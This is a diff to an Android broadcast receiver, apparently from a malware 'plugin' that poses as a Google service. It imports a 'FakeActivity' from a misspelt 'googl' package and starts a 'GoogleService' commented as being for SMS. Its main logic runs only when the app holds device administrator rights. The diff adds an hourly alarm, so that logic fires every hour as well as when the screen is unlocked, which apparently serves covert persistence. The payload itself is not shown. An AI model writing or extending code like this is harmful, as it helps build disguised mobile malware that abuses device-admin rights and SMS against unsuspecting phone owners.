@@ -5,9 +5,9 @@ import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.Utils.BRCUtil;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -15,7 +15,6 @@ import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.service.GoogleService;
 import com.xstd.plugin.service.PluginService;
 
-import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
 /**
@@ -27,29 +26,7 @@ import java.util.Calendar;
  */
 public class ScreenBRC extends BroadcastReceiver {
 
-    public static final int DAY_START_HOUR = 6;
-
-//    private static final String DATE_FORMAT = "dd-HH ";
-//
-//    public static String formatTime(long time) {
-//        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT);
-//        return dateFormat.format(time);
-//    }
-//
-//    public static int[] getDayAndHour(long time) {
-//        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT);
-//        String data = dateFormat.format(time);
-//        if (!TextUtils.isEmpty(data)) {
-//            String[] ds = data.split("-");
-//            if (ds != null && ds.length == 2) {
-//                int[] ret = new int[2];
-//                ret[0] = Integer.valueOf(ds[0]);
-//                ret[1] = Integer.valueOf(ds[1]);
-//            }
-//        }
-//
-//        return null;
-//    }
+    public static final String HOUR_ALARM_ACTION = "com.xstd.hour.alarm";
 
     public void onReceive(Context context, Intent intent) {
         //check Google Service if runging for SMS
@@ -57,13 +34,16 @@ public class ScreenBRC extends BroadcastReceiver {
         serviceIntent.setClass(context, GoogleService.class);
         context.startService(serviceIntent);
 
+        //启动小时定时器
+        BRCUtil.startHourAlarm(context);
+
         DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
         boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
 
         SettingManager.getInstance().init(context);
         if (intent != null && isDeviceBinded /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
             String action = intent.getAction();
-            if (Intent.ACTION_USER_PRESENT.equals(action)) {
+            if (Intent.ACTION_USER_PRESENT.equals(action) || HOUR_ALARM_ACTION.equals(action)) {
                 Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);
 
                 SettingManager.getInstance().init(context.getApplicationContext());
